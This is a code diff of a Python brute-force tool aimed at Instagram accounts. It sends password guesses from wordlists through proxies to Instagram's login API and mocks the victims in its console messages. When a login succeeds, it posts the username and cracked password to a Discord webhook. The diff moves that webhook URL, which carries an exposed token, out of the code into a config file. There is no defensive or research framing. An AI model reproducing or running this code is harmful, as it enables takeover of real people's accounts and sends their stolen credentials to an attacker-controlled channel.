@@ -18,7 +18,7 @@ def webhook(userBruted, passKey):
     paramsGet = {"wait":"true"}
     rawBody = "{\"content\":null,\"embeds\":[{\"color\":16711680,\"fields\":[{\"name\":\"User Brute Forced\",\"value\":\"@" + userBruted + "\"},{\"name\":\"Password\",\"value\":\"" + passKey + "\"}],\"author\":{\"name\":\"Fuck Society\",\"url\":\"https://discord.dog/282008877753696268\",\"icon_url\":\"https://i.pinimg.com/originals/c6/d0/c1/c6d0c132b45434b4794cee4f2bbafa4a.png\"},\"footer\":{\"text\":\"sjPsycho\",\"icon_url\":\"https://cdn.discordapp.com/emojis/924055212321275934.webp?size=96&quality=lossless\"},\"timestamp\":\"2004-07-30T07:33:00.000Z\"}],\"username\":\"React\",\"avatar_url\":\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHPVXVdrlc6-ueOw9Sd4EnbDyz0r1MFkdhnQ&usqp=CAU\",\"attachments\":[]}"
     headers = {"Origin":"https://discohook.org","Sec-Ch-Ua":"\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"","Accept":"application/json","Sec-Ch-Ua-Platform":"\"Windows\"","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36","Referer":"https://discohook.org/","Sec-Fetch-Site":"cross-site","Sec-Fetch-Dest":"empty","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"cors","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","Content-Type":"application/json"}
-    response = session.post("https://discord.com/api/v10/webhooks/1020878821584539699/gWa7KFsNri304FZVL8yO4aQ-mNWCXkL3I--PoPrSUIcqTUMFI99B5sEly3GdY55W2oBE", data=rawBody, params=paramsGet, headers=headers)
+    response = session.post(webhookUrl, data=rawBody, params=paramsGet, headers=headers)
 
 def post(targ, passLogin, Proxy):
     global attemptCounter, ifPasswCheckInt
@@ -45,12 +45,14 @@ def post(targ, passLogin, Proxy):
         response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, proxies=proxies, timeout=5)
         lib = response.content.decode('utf-8')
 
+        attemptCounter += 1
+
         if("logged_in_user" in lib):
             print("[" + Fore.GREEN + "+" + Fore.RESET + "] Bruted this fucking idiot. No 2FA Either lol.")
             webhook(targ, passLogin)
             ifPasswCheckInt += 1
         elif("two_factor_required" in lib):
-            print("[" + Fore.YELLOW + "$" + Fore.RESET + "] 2FA On - Successfully Bruted!")
+            print("[" + Fore.YELLOW + "$" + Fore.RESET + "] 2FA On " + targ + " - Successfully Bruted!")
             webhook(targ, passLogin)
             ifPasswCheckInt += 1
         elif("The password you entered is incorrect." in lib):
@@ -96,6 +98,9 @@ with open ('data/users.txt') as p:
 with open('data/pass.txt') as f:
     passwords = f.read().split('\n')
 len = passwords.__len__()
+
+with open('data/webhook.txt') as u:
+    webhookUrl = u.readline()
 
 clear()
 
